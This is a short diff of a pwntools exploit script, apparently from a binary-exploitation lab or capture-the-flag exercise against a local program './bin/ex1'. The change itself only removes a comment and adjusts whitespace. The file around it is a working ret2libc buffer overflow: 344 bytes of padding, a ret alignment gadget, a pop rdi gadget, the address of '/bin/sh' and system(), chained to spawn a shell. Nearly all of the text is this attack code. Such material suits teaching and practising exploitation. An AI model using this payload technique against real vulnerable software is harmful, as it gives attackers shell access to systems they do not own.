@@ -4,7 +4,7 @@ from pwn import *
 context.binary = ELF('./bin/ex1', checksec=False)
 context.log_level = 'debug'
 
-OFFSET = 344  # calculat in gdb: (long)($rbp + 8) - (long)&name
+OFFSET = 344 
 
 SYSTEM      = 0x7ffff7dff110     # p system
 BINSH       = 0x7ffff7f53ea4     #search "/bin/sh"
@@ -13,7 +13,8 @@ RET         = 0x401016           #  'ret' din binar
 
 def build_payload():
     payload  = b"A" * OFFSET
-    payload += p64(RET)          
+    payload += p64(RET)         
+   
     payload += p64(POP_RDI_RET)  
     payload += p64(BINSH)       
     payload += p64(SYSTEM)       
